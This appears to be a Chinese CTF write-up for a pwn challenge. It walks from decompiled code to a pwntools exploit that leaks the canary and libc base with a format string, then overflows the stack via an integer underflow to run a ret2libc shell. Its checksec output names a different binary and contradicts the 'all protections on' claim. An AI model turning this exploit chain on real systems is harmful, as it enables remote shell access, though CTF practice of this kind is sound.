# 【困难】寻￥环游记

> “很难想象，liunx 的保护如此脆弱，一个 Format String 就将 PIE,Canary 等一众高手杀的片甲不留”，出题人如实说到。“什么？没有后门你就不知道接下来怎么办？看看远方的 libc 吧！”

# 题目分析
看到 hint 不难想到是 fmt 泄露 Canary 和 PIE 的基地址，然后打 ret2libc 就好了。

ida 看看：
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int nbytes; // [rsp+Ch] [rbp-34h] BYREF
  char nbytes_4[16]; // [rsp+10h] [rbp-30h] BYREF
  char v6[24]; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 v7; // [rsp+38h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts(
    "My roommate lost 100 on his way back from a trip during the National Day holiday. Can you help him recall where he left it?");
  puts("Where do you think he left his money?");
  printf(format);
  read(0, nbytes_4, 0x10uLL);
  printf("I will try to find the money he lost at the ");
  printf(nbytes_4);
  puts("Please give me your name. If I find it, I will repay you!");
  puts("First, how long is your name?");
  printf(format);
  __isoc99_scanf("%d", &nbytes);
  if ( nbytes <= 16 )
  {
    puts("What is your name?");
    printf(format);
    read(0, v6, (unsigned int)nbytes);
    puts("Thank you for your help!");
  }
  else
  {
    puts("Too long!");
  }
  return 0;
}
```

看看保护，保护全开！
``` C
┌──(kali㉿LAPTOP-9O25NAN3)-[~/Desktop/nex_practice/fmt]
└─$ checksec ./ancient_book
[*] '/home/kali/Desktop/nex_practice/fmt/ancient_book'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
``` 

ok，漏洞很明显 ： fmt -> 整形下溢 -> 栈溢出

对了，为了方便调试，建议用 `patchelf` 将题目的 libc 和 ld 改为出题人提供的。

# exp
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

p = process('./where_is_money')
# p = remote('202.199.6.66', 39706)
elf = ELF('./where_is_money')
libc = ELF('libc.so.6')

payload = b'%13$p%17$p%35$p\n'
p.sendlineafter(b'> ', payload)
p.recvuntil(b'0x')
canary = int(p.recv(16), 16)
p.recvuntil(b'0x')
main_addr = int(p.recv(12), 16) # 这个实际上可以不用，看下面是如何利用的
p.recvuntil(b'0x')
libc_base = int(p.recv(12), 16) - 0x29e40

success('canary: ' + hex(canary))
success('main_addr: ' + hex(main_addr))
success('libc_base: ' + hex(libc_base))

p.sendlineafter(b'> ', b'-1')        # 整形下界溢出

# 0x00000000000011f1 : pop rdi ; ret
# pop_rdi_ret = main_addr - elf.sym['main'] + 0x00000000000011f1
# ret_addr = main_addr - elf.sym['main'] + 0x000000000000101a

# 当然，用 libc 中的 pop_rdi_ret 也行
# ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep rdi
# 0x000000000002a745 : pop rdi ; pop rbp ; ret
# 0x000000000002a3e5 : pop rdi ; ret
pop_rdi_ret = libc_base + 0x000000000002a3e5
ret_addr = pop_rdi_ret + 1
system_addr = libc_base + libc.sym['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

success('pop_rdi_ret: ' + hex(pop_rdi_ret))
success('system_addr: ' + hex(system_addr))
success('bin_sh_addr: ' + hex(bin_sh_addr))

payload = flat(
    b'A' * 0x18,
    canary,
    b'deadbeef',
    ret_addr,
    pop_rdi_ret,
    bin_sh_addr,
    system_addr,
)

p.sendafter(b'> ', payload)

p.interactive()
```

get shell 后，cat flag 就好了